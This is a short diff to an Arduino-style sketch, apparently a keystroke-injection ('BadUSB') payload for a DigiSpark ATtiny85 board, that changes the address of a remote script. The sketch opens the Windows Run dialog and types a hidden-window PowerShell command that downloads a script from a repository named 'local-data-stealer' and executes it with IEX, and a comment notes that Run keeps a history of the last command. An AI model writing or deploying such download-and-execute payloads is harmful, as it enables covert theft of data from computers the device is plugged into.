@@ -7,7 +7,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   // Add a delay to make sure that "Run" is opened before typing any command
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("powershell.exe -windowstyle hidden -command \"$w=New-Object net.webclient; $c=$w.DownloadString('https://raw.githubusercontent.com/LucaReggiannini/local-data-stealer/master/lds.ps1'); IEX $c;\"");
+  DigiKeyboard.print("powershell.exe -windowstyle hidden -command \"$w=New-Object net.webclient; $c=$w.DownloadString('https://raw.githubusercontent.com/LucaReggiannini/local-data-stealer-ATTiny85/master/lds.ps1'); IEX $c;\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   // "Run" saves the last command launched and shows it at the next opening.
